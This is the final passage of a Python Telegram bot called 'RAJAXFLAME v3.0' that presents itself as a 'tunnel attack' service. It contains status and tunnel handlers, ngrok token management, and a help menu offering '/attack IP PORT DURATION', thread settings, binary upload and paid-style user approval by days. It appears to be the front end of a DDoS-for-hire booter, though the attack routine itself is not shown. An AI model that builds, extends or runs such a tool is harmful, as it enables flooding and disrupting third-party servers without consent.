🕒 Started: {status['start_time'][11:19]} UTC
⏱ Time Left: {max(0, int(time_left.total_seconds()))}s
🔗 Tunnels: {len(status['tunnel_urls'])}
🔑 Ngrok Tokens: {len(status['ngrok_tokens'])}
"""
    
    await send_rajaxflame_message(context, chat_id, status_text, "status")

async def cmd_tunnel_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detailed tunnel status only"""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    tunnel_text = ""
    
    # 🎯 CURRENT CHAT TUNNELS
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    if active_tunnels:
        tunnel_text += f"""
🎯 **YOUR ACTIVE TUNNELS ({len(active_tunnels)}):**
"""
        for tunnel_key in active_tunnels:
            tunnel_data = ACTIVE_TUNNELS[tunnel_key]['data']
            tunnel_url = extract_tunnel_url(tunnel_data)
            tunnel_text += f"""
🔗 URL: `{tunnel_url}`
🆔 ID: `{tunnel_data.get('id', 'N/A')}`
📊 Status: `{tunnel_data.get('status', 'active')}`
⏰ Created: Recently
🔑 Token: `{ACTIVE_TUNNELS[tunnel_key]['token'][:12]}...`
"""
    else:
        tunnel_text += """
❌ **NO ACTIVE TUNNELS**

💡 **To create tunnels:**
Use `/attack IP PORT TIME`
Tunnels automatically created during attack
"""
    
    # 🎯 USER'S NGROK TOKENS STATUS
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    if ngrok_tokens:
        valid_tokens = [t for t in ngrok_tokens if validate_ngrok_token(t)]
        tunnel_text += f"""
🔑 **YOUR NGROK TOKENS:**
✅ Valid: {len(valid_tokens)}
📜 Total: {len(ngrok_tokens)}
🟢 Ready: {'YES' if valid_tokens else 'NO'}
"""
    else:
        tunnel_text += """
❌ **NO NGROK TOKENS FOUND**

💡 **Add tokens using:**
/setngrok YOUR_NGROK_TOKEN
"""
    
    await send_rajaxflame_message(context, chat_id, tunnel_text, "tunnel")

async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all active tunnels for user"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    
    if not active_tunnels:
        await update.message.reply_text("""
🌐 **NO ACTIVE TUNNELS**

💡 Your tunnels will appear here when you start attacks with /attack command
""")
        return
    
    tunnels_text = f"""
📊 **Total Active Tunnels:** {len(active_tunnels)}
"""
    
    for i, tunnel_key in enumerate(active_tunnels, 1):
        tunnel_info = ACTIVE_TUNNELS[tunnel_key]
        tunnel_url = extract_tunnel_url(tunnel_info['data'])
        tunnels_text += f"""
🔗 **Tunnel {i}:**
🌐 URL: `{tunnel_url}`
⏰ Status: ✅ ACTIVE
🔑 Token: `{tunnel_info['token'][:12]}...`
"""
    
    await send_rajaxflame_message(context, chat_id, tunnels_text, "tunnel")

# ================ OTHER COMMAND HANDLERS ================
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🔥 **RAJAXFLAME v3.0 - COMMAND GUIDE**

🔹 **User Commands**
/start - Welcome message and bot info
/help - Show this command guide
/attack IP PORT DURATION - Launch tunnel attack
/status - View attack and token status
/tunnelstatus - Detailed tunnel status
/mytunnels - Show your active tunnels
/setngrok - Add Ngrok Auth Tokens
/check - Validate Ngrok tokens
/debug_tokens - Debug token issues
/tunneltest - Test tunnel creation

🔹 **Admin Commands**
/control - Open admin control panel
/logs - View recent attack logs
/add USERID DAYS - Approve user
/remove USERID - Remove user
/threads NUMBER - Set default threads
/file - Upload rajaxflame binary
/stop - Stop ongoing attack

🔹 **Owner Commands**
/addadmin USERID - Add admin
/removeadmin USERID - Remove admin

👨‍💻 **Contact:** {DEVELOPER_TAG}
"""
    await send_rajaxflame_message(context, update.effective_chat.id, help_text, "welcome")

# ================ 🏗️ APPLICATION BUILDER 🏗️ ================
def build_rajaxflame_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("setngrok", cmd_setngrok))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("tunnelstatus", cmd_tunnel_status))
    app.add_handler(CommandHandler("mytunnels", cmd_my_tunnels))
    app.add_handler(CommandHandler("tunneltest", cmd_tunnel_test))
    app.add_handler(CommandHandler("debug_tokens", cmd_debug_tokens))
    app.add_handler(CommandHandler("check", cmd_check))
    
    # Add other handlers as needed
    # app.add_handler(CommandHandler("control", cmd_control))
    # app.add_handler(CommandHandler("logs", cmd_logs))
    # app.add_handler(CommandHandler("add", cmd_add))
    # app.add_handler(CommandHandler("file", cmd_file))
    
    return app

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    print("""
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **TUNNEL ATTACK**      ║
║    💥 **NGROK INTEGRATION**  ║
╚══════════════════════════════╝
    """)
    
    # Initialize token files if they don't exist
    if not os.path.exists(NGROK_TOKENS_FILE):
        with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
            f.write("# Ngrok Tokens File\n")
        print("✅ Ngrok tokens file created")
    
    app = build_rajaxflame_app()
    app.run_polling()